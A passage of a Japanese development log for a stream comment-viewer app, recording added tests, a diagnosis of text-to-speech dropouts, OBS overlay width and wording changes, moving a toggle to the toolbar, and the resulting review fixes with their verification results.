  フィールドを**明示列挙**して詰め替えるため、1 箇所でも書き漏らすと**型検査もテストも通るのに値だけ静かに消える**
  （mapper 側のテストは `Comment` までしか見ないので、その先はここでしか守れない）。
  - 付随数値（`comboCount` / `monthCount` / `giftCount` / `tier`）が wire まで 1 つも落ちないこと。
    **「落ちたフィールド名の一覧が空」**という形の表明も置き、将来フィールドが増えたときの網にした。
  - 境界: 未設定は最後まで `undefined`（0 やキー生成へ劣化しない）。0 は改変せず素通し（劣化判断は mapper の責務）。
  - §9: 中継後に URL・受領側フィールド名・gifter/recipient 等が現れないこと。
  - 回帰: eventType 写像／`monetaryAmount` 文字列と `monetary` 数値の**両方**を通すこと（数値側は Rust の
    UPDATE 列に対応するので落とせない）／BITS の "N bits" 表記。
  - アバターは未設定の DTO を使うため `resolveAvatarDataUri` は fetch せず、**テストは一切ネットに出ない**（§1）。
- **`apps/comment-sidecar/scripts/test-dev-mock.mjs`（新規・39 アサート）** — dev-mock の周期仕様。
  progress.md には「フェイクタイマーで実測した」とあったが**テストとして固定されていなかった**。
  タイマーは `globalThis.setTimeout/setInterval` を偽物へ差し替えて駆動する（実時間を待たない・依存追加なし）。
  - **combo 更新が「同一 id の再送」であること**（`seq%20===12` が `seq%20===9` と同一 id・同一投稿者）。
    ここが崩れると別 id の新規コメント 2 件になり、3 層貫通の実機確認そのものが成立しない。
  - 本体には `comboCount` を付けず combo 側だけ `3`／金額は本体の 3 倍／通貨は JEWELS のまま。
  - 設計原則: **`seq%5===0` の superchat 枠を奪った周期が無い**こと（jewels の周期はすべて `%5 ≠ 0`）。
  - 境界: combo の 1 回目が無ければ「更新」だけを出さない（通常チャットへ落ちる）。
  - **回帰（レビュー指摘 S-6）**: stop → start で combo の記憶を捨て、**前セッションの id を再送しない**。
  - §9/§1: 合成コメントに第三者個人情報・URL が現れない。
- **`viewer_memory/service.rs` +4 件** — combo 更新を **service 層（trim / 制御文字拒否）経由**で通したときの仕様。
  repository のテストは repository を直接叩くため、**§8 の検証が更新経路にも効くこと**は未担保だった。
  - service 経由でも combo 更新が成立し金額が置き換わる／行は増えない／**`combo_count` は端末保存されない**。
  - **§8: 更新側の本文に制御文字が入っていたら弾かれ、既存行は 1 バイトも変わらない**
    （frontend 由来の値が検証をすり抜けて既存レコードを壊さない）。
  - 更新側の本文も trim される（挿入経路と同じ整形が効く）。
  - **プライバシー手段の非退行**: combo 更新を経た jewels 行も `delete_viewer` の FK CASCADE で取り残しゼロ
    （security.md 方針⑪の主張をテストで固定）。
- **`mergeComments.test.ts` +7 件** —
  - **jewels 以外の全種別**（chat / superchat / membership / subscription / gift / donation）で同一 id が
    完全スキップされること（`it.each`）。種別が増えたときに限定を緩めた変更を検知する。
  - prev にある jewels が同一バッチで 2 回更新されても、表示は 1 行・最新値／TTS には載らない／
    記録へ最後に届く値が表示と一致すること（`updated` の件数そのものは実装都合なので表明しない）。

### 仕様の取り違えを 1 件訂正（テストを歪めずに直した）

`seq%5===0` に関する最初のアサートを「superchat は `%5===0` にしか出ない」と書いたところ落ちた。
実装を確認すると **seq 1/21/41（`seq%20===1`＝043c の赤スパ長文枠）も superchat を出す**のが正しく、
`makeComment` 冒頭が定める設計原則は「投げ銭系の周期はすべて `%5 ≠ 0`＝**superchat 枠を奪わない**」だった。
**実装が正・アサートが誤り**だったため、「`seq%5===0` が必ず superchat のまま」を表明する形へ書き直した。

### 検証結果

- `pnpm --filter @stream-dock/comment-sidecar typecheck` / `test`（**135 → 191 PASS**・relay 19＋dev-mock 39 追加）
- `pnpm --filter ./apps/desktop typecheck && lint && test`（**132 → 139 tests PASS** / 13 files）
- `cargo check` / `cargo test`（**全体 91 passed**・`viewer_memory` は 44 → 48）
- `gen:bindings` 再生成で binding 差分は 043e 分のまま（drift ゼロ）
- 新規依存ゼロ（`pnpm-lock.yaml` / `Cargo.lock` / dependencies すべて差分なし＝§10）

### ユニットテストで担保できず **E2E（手動）に残した**もの

- `CommentViewerApp` の結線（`updated` → `recordComments` が呼ばれ `enqueueForSpeech` には渡らない）。
  同コンポーネントのテストが存在せず、WS 接続・TTS・invoke を丸ごとモックする新規テストが必要になるため。
- 表示の見え方（`×N` のレイアウト・金額バッジが無いときの並び・オーバーレイの追随）。
- StrictMode の updater 二重実行・OBS 実窓での表示。
- 実データ（YouTube 本番の Jewels combo）でのフェーズ2 判別。

## 2026-07-28 (読み上げ不具合の調査＝原因特定と 049/050 起票)

「読まれるコメントと読まれないコメントがある（長文コメントの後が怪しい）／メンシプ更新も読み上げてほしい」
という報告を受けて実コードを調査した。**原因は 2 つ確定・1 つは実機確認待ち**。コード変更はしていない。

### 【確定】原因1: 長文の後のコメントが消える＝`MAX_BACKLOG` の「古い未読の無言破棄」

読み上げは FIFO 直列で、1 件の再生が終わるまで `playing` が true のまま次に進まない
（`ttsQueue.ts` の `pump` 76-114 行）。一方 `MAX_BACKLOG = 20`（19 行）超過分は
**`queue.splice(0, dropped)` で古い方＝長文の直後に届いたコメントから捨てられる**（131-136 行）。
通知は `console.debug` のみでユーザーには見えない。

| 1 件の長さ | 読み上げ所要（≒4.5〜6 文字/秒） | dev-mock(1800ms) で届く数 | 破棄 |
| --- | --- | --- | --- |
| 290 文字（dev-mock の長文枠・赤スパ本文上限相当） | **48〜64 秒** | 27〜38 件 | **7〜18 件** |
| 60 文字（048 の既定上限） | 10〜13 秒 | 5〜7 件 | **0 件** |

増幅要因: ①1 件あたりの文字数上限が無い ②`synthesize` にタイムアウトが無く
（`voicevox.ts` が `signal` を受け取れるのに `ttsQueue` が渡していない・98-102 行に「意図的」と明記）、
ENGINE が詰まると `playing` が張り付いてその間の到着分が全部捨てられる。

→ **既存の [048](tasks/048-tts-reading-length-cap.md)（文字数上限）が主対策**。重複起票は避け、
048 の冒頭に上記の定量根拠と「最優先」「実装順 048 → 050 → 049」を追記した。

### 【確定】原因2: メンシプ等が無音＝読み上げ入力が `comment.text` だけ

`ttsQueue.enqueue` は `sanitizeForSpeech(comment.text)`（121 行）しか見ず、空ならスキップする（130 行）。
一方 `membership`/`gift` の `text` は空で、画面表示は `viewerFormat.ts` の `composeEventMessage`（133-157 行）が
「〇〇さんがメンバーシップを6ヶ月継続しました」を**別途**組み立てている。
＝**画面に出ている文言が TTS の入力に一度も渡っていない**（043b で表示側だけ実装され読み上げ側が追従しなかった）。

- 対象: `membership` / `gift` / `subscription`（自由コメントがある時だけ本文のみ読まれる）/ `jewels`。
- ⚠ **`jewels` は dev-mock でだけ読まれる**（`dev-mock.ts` が `text = "投げ銭ジュエル 🎁"` を入れるため）。
  実データの `GIFT_EVENT` は本文が空なので**本番のみ無音**＝dev 確認では永久に気付けない罠だった。

→ **[049](tasks/049-monetary-event-speech.md) として起票**。

### 【要確認】原因3: AudioContext suspended 時の一括ドロップ

`pump` は `ctx.state !== "running"` のとき **その 1 件を捨てて `finally` から `pump()` を再帰**する（87-97 行）。
アプリが背面に回る等で suspended になると、ユーザー操作が来るまで resume できずキュー全体が無音消費されうる。
通知は `console.debug`（95 行）のみ。**実機での発生は未確認**（Console に「AudioContext が running でない」が
出るかで切り分け可能）。この設計は 82-86 行のコメントどおり**永久ハング回避のため意図的**なので、
ハングを再発させない形でしか変えられない。

→ **[050](tasks/050-tts-dropout-protection.md) として起票**（可視化を先に入れて発生の有無を確定させてから挙動変更を判断）。

### 横断的な問題

`ttsQueue.ts` / `voicevox.ts` / `readingDictionary.ts` に**単体テストが 1 つも無い**（`find` で確認）。
049・050 のどちらでも `ttsQueue.test.ts` を新設し、`synthesize`/`playWav` をモックして
「通信も音声再生もしない」形でテストを入れる。

### 起票時に確定した設計判断（本人回答・2026-07-28）

1. **長文は文字数で打ち切る**（048 の既定 60 字・「以下略」）。速度アップ（`speedScale`）と `MAX_BACKLOG` 拡大は採らない
   （後者は「今のコメント」ではなく「数分前のコメント」を読み続ける、より悪い体験になるため）。
2. **課金イベントだけ投稿者名を読む**。`ttsQueue.ts` 冒頭の既存方針「著者名は読まない（本文のみ）」は
   通常チャット・スパチャで維持し、課金イベントを**限定的な例外**にする（誰が支援したかを音で分かるようにするのが目的）。
3. **jewels の文言を新設する**。ただし実コードを追った結果、**読み上げ専用**とし表示側
   （`composeEventMessage` が jewels に null を返す 043b の意図的な設計）は**変えない**方針に倒した
   ＝表示の回帰リスクゼロ。起票時の選択肢説明では「表示にも出る」と書いたが、より安全な側へ寄せた
   （表示にも出したい場合は 049 完了後に別途起票・1 行で済む）。

## 2026-07-28 (OBS オーバーレイの横幅: 640 を試して **400 へ差し戻し**)

「オーバーレイの横幅が狭く、長文コメントがあると他のコメントが全部流されてしまう」という報告を受けて
幅を 400 → 640 に広げたが、**実機で「広すぎる」と判断され同日中に 400 へ戻した**（コード差分ゼロ＝HEAD と同一）。
同じ変更を繰り返さないための記録。

- **現状（変更前＝現在）**: オーバーレイ窓の幅は `apps/desktop/src-tauri/src/lib.rs` の
  `open_comment_overlay_window` で **`inner_size(400.0, 720.0)` / `min_inner_size(240.0, 320.0)`** とハードコード。
  コメントビューア本体は 960px で、オーバーレイだけが狭い。高さは有限なので、1 件が長く折り返すほど
  表示できる件数が減って他のコメントが押し出される。
  `.decorations(false)` でタイトルバーが無く**手動リサイズが実質できない**うえサイズは永続化もされないため、
  開き直すたびに 400px に戻る＝幅を変えるなら既定値を変えるしかない。
- **試した値と結果**: **640（1920px キャンバスの約 1/3）は広すぎた**。配信画面の占有が大きすぎる、が差し戻し理由。
  次に試すなら **400 と 640 の間（480〜520 あたり）** が候補。
- **調査で分かったこと（次回も有効）**:
  - **CSS 変更は不要**。`OverlayApp.module.css` / `OverlayComment.module.css` に `max-width` の制約は無く
    （`width: 0` / `min-width: 0` は flex の縮小許可イディオム）、レイアウトは**完全可変幅**なので窓幅に追従する。
  - **044a（OBS 自動ソース追加）への影響なし**。`obs-helpers.ts` の照合は窓名（`owner_name` / `window_name`）で
    行っており**寸法を見ていない**ため、サイズを変えてもソースの照合は壊れない。
    ただし**既に OBS へ追加済みのソースは取り込み解像度が変わるため、シーン上の位置/サイズの再調整が要る**
    （ユーザー操作。この手戻りコストが「気軽に試せない」原因でもある）。
  - 変更対象は `lib.rs` の 2 行のみで、capability・依存・外部通信・CSS はいずれもゼロ。
- **示唆（未起票）**: 幅の好みは配信レイアウト依存で一発では決まらないため、固定値を動かすより
  **オーバーレイ設定（`overlaySettings`）に幅の項目を出してユーザーが調整できるようにする**ほうが筋が良い。
  要望が出たら起票する（既存の overlayFont / サイト名表示と同じ localStorage 同期の枠に乗る）。

## 2026-07-28 (045a 「OBSオーバーレイ」文言リネーム → 「コメントをOBSに表示」)

親 [045](tasks/045-obs-overlay-clarity.md) の要望①（「OBSオーバーレイ」では何をする機能か伝わらない）に対し、
**ユーザー可視文言だけ**を「コメントをOBSに表示」基調へ統一（本人「実装して」）。開閉・通信・意匠・自動追加のロジックは一切変更なし。

### 語彙の統一方針

- **表示（開閉）** = 「コメントをOBSに表示」（オーバーレイ窓を開いて見せる行為）
- **自動反映（044a）** = 「自動で反映」（OBS 側にソースを作る行為。親 045 の「表示 と 自動反映 の概念分離」に対応する**別語**であり、語彙の混在ではない）
- **「オーバーレイ」** = **OBS 実窓名リテラルの中だけ**に残す（固有名詞扱い）

### 文言対応表（すべて `SettingsView.tsx`）

**「行」は改名前（HEAD `c736beb`）の行番号**。実装後は後述のレビュー対応でさらにずれているので、
現物を探すときは行番号ではなく文字列で grep すること（改名後の行番号は [045](tasks/045-obs-overlay-clarity.md) 21-25 行が正）。

| 行(before) | before | after |
|---|---|---|
| 236 | `OBSオーバーレイ`（カード見出し） | `コメントをOBSに表示` |
| 239 | 表示トグル label `OBS オーバーレイを表示` | `コメントをOBSに表示` |
| 244-246 | `OBSの「ウィンドウキャプチャ」で「StreamDock コメントオーバーレイ」を選ぶとコメントを重ねられます。` | `OBSの「ウィンドウキャプチャ」で、コメント表示用のウィンドウ「StreamDock コメントオーバーレイ」を選ぶと、配信画面にコメントを重ねられます。` |
| 261 | 自動追加トグル label `OBS へ自動追加（連携）` | `OBSに自動で反映する` |
| 266 | `ONにすると、コメントオーバーレイを表示する際、OBSに自動的にオーバーレイが反映されます。` | `ONにすると、上の手動でのウィンドウキャプチャ追加が不要になり、コメントをOBSに表示するときにOBS側へ自動で反映します。`（下記レビュー対応 Q-2 で加筆） |
| 274-276 | 状態表示 `OBSにオーバーレイを表示しました。` | `OBSにコメントを表示しました。` |
| 380-383 | `ON にすると、オーバーレイの各コメントに配信サービス名（Twitch / YouTube）を…` | `ON にすると、OBSに表示する各コメントに配信サービス名（Twitch / YouTube）を…` |

- **表示トグル label は「見出しと同文（自己完結型）」を選択**（本人判断）。045b で本体ツールバーへ移設しても
  単体で意味が通り、**再改名が不要**なため（ツールバーの「VOICEVOX読み上げ」と同じ自己完結型）。カード内の見出しとの重複は 045b の移設で解消する。
- **261 行（044a の自動追加トグル）は 045a の対象リスト外だったが、本人判断で改名**。親 045 の完了条件・`docs/progress.md`・
  直近コミットがいずれも「自動反映」表記であり、「連携」という曖昧語も消せるため。

### OBS 実窓名を据え置いた理由（重要・次回も有効）

`StreamDock コメントオーバーレイ` は**改名していない**。
- Rust 側の窓タイトル `lib.rs:197` と sidecar 側の `OBS_SOURCE_NAME`（`apps/comment-sidecar/src/obs/obs-client.ts:39`）が同じ文字列で、
  044a の自動追加は**窓名一致（`owner_name` + `window_name`）**でオーバーレイ窓を探す。変えると自動追加が壊れる。
- 既存ユーザーが OBS 側で手動追加した「ウィンドウキャプチャ」ソースの参照先も切れる。
- そのため 244-246 行の注記では**リテラルを 1 文字も変えず**、直前に「コメント表示用のウィンドウ」という同格の説明を足して
  「引用符の中身＝OBS のウィンドウ一覧に出る名前」だと分かる形にした。

### テストのアサート追従（タスクファイル未記載の落とし穴）

`SettingsView.obs.test.tsx` が旧文言を直接アサートしていたため追従（**テストの意図は変えず文字列のみ差し替え**）:
- 63 行 `getByRole("switch", { name: "OBS へ自動追加（連携）" })` → `"OBSに自動で反映する"`
- 181・185 行 `getByText("OBSにオーバーレイを表示しました。")` → `"OBSにコメントを表示しました。"`
- 10 行のファイル先頭 doc コメントも新 label へ追従（改名前の名前も併記して追跡可能にした）

045a のタスクファイルの「確認コマンド」に `test` が無かったため、**タスクファイル側にも 1 行追記**した
（可視文言を変えるタスクは以後もテストを回すこと）。

### 非可視の据え置き

コード内コメント・CSS・識別子・localStorage キー・型名・窓 label `comment-overlay` は**改名なし**（レビュー範囲と回帰リスクを広げないため）。
唯一の例外として、`SettingsView.tsx` 229 行のコメントブロックに **045a の注記 2 行を追記**（既存文は削除していない）。
「見出しは改名したが窓 label / 実窓名は据え置き」という次の読み手が必ず引っかかる点を明示するのが目的。
別概念の「オーバーレイ」（`TutorialOverlay`、視聴者詳細の全幅オーバーレイ CSS）は対象外。

### 検証結果

- `pnpm --filter ./apps/desktop typecheck` **pass**
- `pnpm --filter ./apps/desktop lint` **pass**
- `pnpm --filter ./apps/desktop test` **pass**（13 files / 139 tests）
- `git status --short -- apps/desktop/src-tauri/ apps/desktop/src/features/comment-viewer/overlaySettings.ts` → **差分ゼロ**
- `grep "StreamDock コメントオーバーレイ"` → `lib.rs:197` と `SettingsView.tsx` の注記の**両方に残存**を確認
- 実機確認（`tauri dev`）は本人環境で実施予定

### 軽レビュー（自己確認）

- 変更は frontend の可視文言のみ。**OBS 実窓名リテラル・窓 label `comment-overlay`・localStorage キー・型・props シグネチャは不変**。
- 外部通信宛先・API・capability・依存の追加なし。`csp: null` 不変。Rust / sidecar / CSS は無変更（§1/§3/§10）。
- 044a の窓名一致探索・表示↔自動反映の連動ロジックには一切触れていない。

### セキュリティレビュー／品質レビュー（別チャット実施）と対応

**セキュリティ判定＝問題なし（修正必須ゼロ）**。可視文言限定であること（`src-tauri/` / sidecar / capability /
`tauri.conf.json` / CSS / 依存 / `overlaySettings.ts` すべて差分ゼロ・`csp: null` 不変・新規 invoke/fetch/WebSocket ゼロ）、
§9 のパスワード欄（`obsPasswordInput`・保存後即クリア・`authRequired` 条件表示）と `failed` の平易文言が
**差分ゼロで非退行**であること、`SettingsView` が表示専用（副作用は `useState`＋`useHostOs` のみ）のままであることを確認。

**実窓名の 3 者一致は実測で決着した（重要）**。注記は JSX で行分割されており（`「StreamDock` 改行 `コメントオーバーレイ」`）、
描画時に結合される。esbuild で当該 JSX を実際に変換・評価して描画文字列を取り出し、コードポイント単位で比較した結果、
`lib.rs:197` / `obs-client.ts:39` / UI 描画結果の**3 者が `===` で厳密一致**（区切りは半角スペース U+0020 一個・全角混入なし）。
JSX は行頭インデントを除去して 1 スペースで結合するため意図どおり。**この点の実機目視は不要**（レイアウトの折り返し確認は別）。

対応した指摘:

- **Q-1（中・タスクファイルの行番号ズレ）**: 045a のコメント追記(+2 行)と状態表示の 3 行→1 行整形(−2 行)により、
  **カード先頭〜状態表示だけが +2 ずれ、有効化ガイド(285)以降は無傷**という気づきにくいズレが発生していた。
  とくに 045b の「表示トグル（238-242 行）を撤去」は、現物では**見出しと `cardBody` の開きタグを巻き込む範囲**で
  JSX が壊れる。[045b](tasks/045b-overlay-toggle-to-viewer.md) と親 [045](tasks/045-obs-overlay-clarity.md) の
  行番号・旧 label 参照を現物へ更新した（`CommentViewerApp.tsx` 側は 045a で無変更＝旧記載のまま有効）。
- **Q-2（中・自動反映の注記が主目的を伝えていない）**: 「OBS側へ自動で反映します」だけでは、**すぐ上の手動
  ウィンドウキャプチャ追加が不要になる**というこのトグルの主目的（コードコメント 264-266 行には書いてあった）が
  ユーザーに伝わらず、親 045 の要望①が自動反映側に残っていた。注記に「上の手動でのウィンドウキャプチャ追加が
  不要になり」を加筆（文言のみ・ロジック不変）。
- **Q-3/S-1（中・実窓名リテラルの回帰テスト不在）**: 実窓名は Rust/sidecar/UI のプロセス跨ぎの契約で共有定数にできず、
  かつ注記が JSX 行分割されているため**改行位置を変えると結合結果が黙って変わる**（今回まさに前後へ文字を足して
  結合位置が動いた）。`SettingsView.obs.test.tsx` に回帰テストを 1 本追加。`getByText` は空白を正規化して差を
  吸収するため、**未正規化の `container.textContent`** で厳密に照合している（既存 §8 テストと同じ流儀）。
- **Q-4（低・行番号の before/after 混在）**: 上の対応表が改名前の行番号、「非可視の据え置き」が現在の行番号と
  混在していた。表の見出しを `行(before)` にし、現物は文字列 grep で探す旨を明記。

修正せずコメントで意図を残した指摘（再修正トリガー付き）:

- **見出しとトグル label が同文**（`SettingsView.tsx` 240-244 行）: 045b の移設先で単体で意味が通る自己完結型に
  するための意図的な選択＝移設時に再改名が不要。見出しは `div` で見出し要素ではないため switch のアクセシブル名とも
  競合しない。カード内の重複は 045b の移設で解消する。再修正トリガー＝045b の移設を取りやめる場合。
- **「OBS に」/「OBSに」の表記ゆれ**（`SettingsView.tsx` 276-279 行）: 「OBS に接続しています…」だけ半角スペースありで
  上下の新文言とゆれるが、045a を可視文言リネームの範囲に絞る（CLAUDE.md「1 回 1 機能」）ため据え置き。
  再修正トリガー＝表記ゆれ一括タスクの起票時、または 045b でこの周辺を触るとき。

レビュー対応後の検証: `typecheck` / `lint` pass、`test` pass（13 files / **140 tests**・回帰テスト 1 本追加）。
なお prettier はこのリポジトリの依存に無く（gate は `typecheck`/`lint`）、日本語は分割点が無いため長い注記行は 1 行のまま。

## 2026-07-28 (045b OBS表示トグルをコメビュ本体ツールバーへ移設 ／ 034d の部分反転)

親 [045](tasks/045-obs-overlay-clarity.md) の要望②（OBS への表示 ON/OFF を配信中にワンタッチで切り替えたい）に対し、
表示（開閉）トグルを設定ビューのカードから**本体コメントビューのツールバー**へ移設（本人「実装して」）。
一度きりのセットアップである**自動反映（044a）は設定カードに残置**。前提の 045a（文言リネーム）は `bd9131b` で適用済みで、
移設したトグルの label は 045a が確定した「コメントをOBSに表示」を**そのまま流用**（本タスクで文言は作っていない）。

### 移設は UI の位置だけ（ロジック無変更）

`git diff` で確認済みのとおり、以下は**1 行も変更していない**:
`handleOverlayToggle` 本体 / `handleObsAutoAddToggle` / `requestObsAutoAdd` / `requestObsHide` / `OBS_ENABLE_DELAY_MS` /
マウント時の実窓同期 `isCommentOverlayOpen().then(setOverlayOpen)`。`overlayOpen` state も `CommentViewerApp` に置いたまま
（`handleObsAutoAddToggle` が「未開なら開いてから追加」の判定に参照するため、ここから動かせない）。
トグル用の新しい state・ハンドラ・Rust command・capability・依存は**一切追加していない**。`csp: null` 不変。

### 移した範囲 / 残した範囲

| | 置き場所 |
|---|---|
| 表示（開閉）トグル「コメントをOBSに表示」 | **本体ツールバー**（`CommentViewerApp.tsx` の `toolbarActions`） |
| 自動反映トグル「OBSに自動で反映する」・状態表示・有効化ガイド・パスワード入力 | 設定カード（044a の領分・据え置き） |
| 手動ウィンドウキャプチャ注記（OBS 実窓名リテラル）・Windows 注記・意匠設定 | 設定カード（据え置き） |

### 判断したこと（レビュー時の参照用）

- **配置は右クラスタの先頭**（VOICEVOX 読み上げの左）。`.toolbarActions` は右寄せなので、**先頭挿入だけが既存
  （読み上げ／視聴者／設定）の画面上の位置を動かさない**。VOICEVOX の右へ足すと読み上げトグルだけがずれる。
- **CSS は変更しない**。親 `.toolbar` に既に `flex-wrap: wrap` があり、窓の最小幅は 560px（`lib.rs:131`）。
  追加後の右クラスタは実測見積り ≈470px＋padding 32px で収まる。`.switch` は `flex: none`、`.toggleLabel` は
  `white-space: nowrap` を持たないため、仮に squeeze されてもラベル折り返しになり**横溢れはしない**。
  再検討トリガー＝実機で溢れたら `.toolbarActions` に `flex-wrap: wrap` を 1 行足す。
- **設定カードに導線注記を 1 行残した**（「表示の ON/OFF は、コメント画面の上部にある「コメントをOBSに表示」で
  切り替えます。」）。トグルを抜くと設定画面だけを見ている人が ON にする場所を辿れなくなるため。文言中の
  「コメントをOBSに表示」は移設先トグルの label と**同一文字列**にして指示語を避けている。
- **コメントの追従は 3 箇所だけ**（042b 注記の先例に倣い、既存文は消さず追記）: `SettingsView.tsx` のカード先頭
  コメント／`CommentViewerApp.tsx` の `overlayOpen` state コメント・`handleOverlayToggle` 直上コメント。
  撤去された props（`overlayOpen` / `onOverlayToggle`）とその 034d コメント、045a のレビューコメント（label を
  自己完結型にした理由）は、対象ごと消えるため書き換えていない。

### テスト（`CommentViewerApp` 初のコンポーネントテスト）

`SettingsViewProps` から 2 プロパティを消すと `SettingsView.obs.test.tsx` の `baseProps()` が**余剰プロパティ検査で
typecheck を落とす**（タスクファイル未記載の落とし穴）。該当 2 行を削除し、**このファイルの検証対象＝044a の OBS 連携 UI と
アサートは一切変えていない**。

そのうえで新規 `CommentViewerApp.toolbar.test.tsx` を追加（本人判断で「足す」を選択）。`CommentViewerApp` は
テストハーネスが無かったため、マウント時に走る外部境界を全てモックして隔離する新設ハーネスを書いた
（**外部通信も OS 操作もしない**＝`vitest.config.ts` の方針どおり）:
`windowApi`（検証対象）/ `obsApi` / `commentStream`（制御フレームをスパイできる偽 `CommentStreamHandle`）/
`voicevox` / `voicevoxApi` / `ttsQueue`・`voicevoxPreview`（jsdom に AudioContext が無い）/ `viewerMemoryApi` / `useHostOs`。
`clearMocks` は呼び出し履歴しか消さないため、`beforeEach` で `localStorage.clear()` と既定の解決値を明示的に戻している。

ケース: ①描画と OFF 初期表示 ②OFF→ON で `openCommentOverlayWindow` ③マウント時の実窓同期（034d/034f の回帰）
④ON→OFF で `closeCommentOverlayWindow` ⑤**移設の担保**（設定ビューに表示トグルが無く自動反映トグルは在る）
⑥**044a の連動維持**（自動反映 ON で表示 OFF → `hideObs(4455)`＝削除せず非表示・`disableObs` は呼ばない）。
⑥は指示範囲（描画・ハンドラ呼び出し）を一歩出るが、「絶対に守る境界」に挙がった連動をハーネス新設のついでに
1 ケースで固定できるため入れた（本人に提示済み）。

**3 種のミューテーションでレッドになることを確認**: (A) ツールバーのトグルを削除 → ①〜⑥ 全て fail、
(B) `if (obsAutoAdd) requestObsHide()` を削除 → ⑥ のみ fail、(C) 設定カードにトグルを残す → ⑤ のみ fail。

### 検証結果

`typecheck` / `lint` pass、`test` pass（**14 files / 146 tests**・045a 時点の 140 から +6）。
`git status -- apps/desktop/src-tauri/ apps/comment-sidecar/` は差分ゼロ（Rust・sidecar 無変更）。
`CommentViewerApp.module.css` / `ToggleSwitch.tsx` も無変更。実機確認（`tauri dev`）は本人環境。

### 据え置き（トリガー未発火）→ レビューで反転

045a が残した「『OBS に』/『OBSに』の表記ゆれ」（`SettingsView.tsx` の `obsState === "connecting"` の状態表示）は、
再修正トリガーに「045b でこの周辺を触るとき」とあったが、**本タスクは状態表示ブロックに触れていない**
（触ったのは同カード上部のトグル撤去と導線注記のみ）ため据え置き、と当初判断した。
→ **レビューで反転し、045b 内で解消した**（下記「レビュー対応」）。

### レビュー対応（2026-07-28・セキュリティ＋品質）

セキュリティ判定は **軽微な懸念あり（修正必須 0 件）**。差分に新規の `invoke(` / `fetch(` / `new WebSocket` / 外部 URL は
1 つも無く、`apps/desktop/src-tauri/` と `apps/comment-sidecar/` は差分ゼロ、capabilities・`tauri.conf.json`（`csp: null`）・
`package.json` / `pnpm-lock.yaml` / `Cargo.toml` も差分ゼロであることを実測で確認。窓名リテラル
「StreamDock コメントオーバーレイ」の 3 者一致（`lib.rs:197` / `obs-client.ts:39,41` / `SettingsView.tsx`）も維持。
新規テストの `vi.mock` 9 件と `CommentViewerApp.tsx` の import 一覧を突き合わせ、**塞ぎ漏れが無い**ことも確認した
（未モックの到達可能モジュールは localStorage・純粋関数・副作用なし UI のみ）。

**修正した 4 点**:

- **偽 `CommentStreamHandle` を `satisfies` で実型に固定**。`vi.mock` のファクトリ戻り値はモジュール型と照合されない
  ため、これが無いと `CommentStreamHandle` にメソッドが増えても typecheck が素通りし、実行時の
  `is not a function` まで落ちなかった。ガードが効くことを検証済み（`hideObs` を削ると **TS1360**）。
- **モックの export 面を実モジュールへ揃えた**（`windowApi` 3→5 / `voicevox` 2→6 / `viewerMemoryApi` 1→7 /
  `ttsQueue` 1→2）。`vi.mock` はモジュールを丸ごと差し替えるため、書かなかった export は `undefined` になる。
  今は誰も踏まないが、将来 `CommentViewerApp` 配下が直接 import すると**6 ケースが pass したまま**コンポーネントだけ
  不正な既定値で動く。実体をスプレッドする `importOriginal` 方式は実 invoke / 実 fetch を復活させるので採らない。
- **表記ゆれを解消**（「OBS に接続しています…」→「OBSに接続しています…」）。045b が同カードの本文を編集し、
  4 行上の導線注記で「OBSに」表記を新たに増やした以上、045a のトリガーは**発火**と判断を改めた。
  `SettingsView.obs.test.tsx:192` のアサートも追従（検証の意図は不変）。
- **`SettingsView.tsx` のカード先頭コメントの事実記述を修正**。「1 つのトグルで開閉し…ON=開く / OFF=閉じる」は
  移設後は誤りで、042b 流の追記だけだと読者が誤文を先に読む。先頭の事実記述のみ現状（手動キャプチャ手順＋
  自動反映のセットアップを担う）へ書き換え、034d→045b の反転経緯は残した。ARIA レビューコメントは残る
  自動反映トグルに対して依然有効なので保持（その旨を明記）。

**再修正トリガーをコメント化した 4 点（今回は修正不要）**:

- **接続状態がツールバーに出ない**: 自動反映が localStorage で ON のまま永続するため、設定ビューを開かずに
  ツールバーのトグル ON だけで OBS への loopback WS 接続が走る。宛先（`127.0.0.1:4455` のみ）も契機
  （過去の明示同意＋今の明示操作）も 044a から不変で**新規解禁ではない**が、`obsState` の状態表示は設定カードに
  しか無いため OBS 未起動時の失敗が本体画面に出ない。状態表示の追加は新規 UI＝移設タスクの範囲外。
  トリガー＝実機で「自動反映 ON かつ OBS 未起動」を試して困ると確認できたとき（`CommentViewerApp.tsx` に記載）。
- **カード見出しと中身のずれ**: 見出し「コメントをOBSに表示」がカードに無いコントロール名を指している。改名は
  045a の領分。トリガー＝次の文言タスク起票時（`SettingsView.tsx` に記載）。
- **テストファイル名の粒度**（`.toolbar` より `.overlayToggle` が内容に忠実）: 資産はケースよりハーネス側にあり、
  改名は docs 3 箇所の参照追従を伴う。トリガー＝トグル以外のツールバー仕様を足すとき。
- **ハーネスを共有ファイルへ切り出すか**: 消費者 1 本の段階での抽出は投機的。トリガー＝2 本目のテストファイル。

**②③④の個別ミューテーション（当初未実施）をレビューで補完**し、写経でないことを確認:
`checked={overlayOpen}`→固定値で **4 fail**、`onChange`→no-op で **3 fail**、マウント同期の削除で **3 fail**、
`hideObs` の既定ポート改変で **1 fail**。あわせて ⑥ のアサートを「`hideObs` が 1 回（`disableObs` は 0 回）」と
「port 既定 4455」に分離し、主眼（削除せず非表示）と付随（既定ポート）の意図を読み分けられるようにした。

**横幅の見積り**はレビュー側の独立試算（表示トグル 178 + 読み上げ 168 + アイコン 56 + gap 36 + padding 32 ≒ **470px**）と
一致し、CSS 変更不要の結論も追認。ただし最小幅 560px で先に効くのは**ラベル折り返しではなく `.toolbar` の
`flex-wrap: wrap` による 2 行化**（`.connCluster` も `flex-wrap: wrap` を持つ）。横溢れは起きず、実質変わったのは
2 行化する窓幅が広がった点のみ。実機確認は引き続き有効。

レビュー対応後の検証: `typecheck` / `lint` pass、`test` pass（**14 files / 146 tests**・ケース数は不変でアサートのみ追加）。

## 2026-07-28 (045c E2E回帰修正: 自動反映は表示に従う ／ ツールバーに OBS 接続エラー)

045b の実機 E2E で 2 件の問題が出たため修正（本人「実装して」）。**frontend のみ**・Rust / sidecar / capabilities /
`tauri.conf.json`（`csp: null`）/ 依存はいずれも無変更で、外部通信の宛先追加も無い。

### ① 自動反映 ON でオーバーレイまで勝手に開いてしまう

原因は `handleObsAutoAddToggle` の `else` 分岐（未開ならオーバーレイを開いてから追加）。044a の
「ワンクリックでソース追加まで到達させる」という意図的な設計だったが、**両トグルが同じ設定カードに並んでいた
当時の前提**に依存していた。045b で表示トグルをツールバーへ移設した結果、「設定を ON にしただけで配信画面に
